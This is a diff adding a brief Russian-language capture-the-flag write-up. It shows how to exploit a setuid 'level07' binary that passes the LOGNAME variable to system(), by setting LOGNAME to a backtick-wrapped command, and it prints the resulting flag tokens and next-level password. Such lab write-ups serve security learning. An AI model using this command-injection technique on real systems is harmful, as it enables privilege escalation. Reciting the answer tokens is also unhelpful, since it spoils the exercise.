@@ -1,0 +1,29 @@
+В папке находим бинарный файл level07
+
+> ./level07
+-> level07
+
+Смотрим вызовы библиотек с помощью функции:
+>  ltrace ./level07
+getegid()                                                                 = 2007
+geteuid()                                                                 = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                       = 0
+getenv("LOGNAME")                                                         = "level07"
+asprintf(0xbffff704, 0x8048688, 0xbfffff3c, 0xb7e5ee55, 0xb7fed280)       = 18
+system("/bin/echo level07 "level07
+
+Видим откуда берется значение level07. Функция getenv получает значение переменной среды по макросу LOGNAME.
+> env				(вывод списка всех переменных окружения)
+-> LOGNAME=level07
+
+Изменить параметр среды можно функцией export.
+
+> export LOGNAME='`getflag`'	(так же оборачиваем команду getflag ``)
+> ./level07
+-> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+> su flag08
+Password: fiumuikeil55xe9cu4dood66h
+> getflag
+-> Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
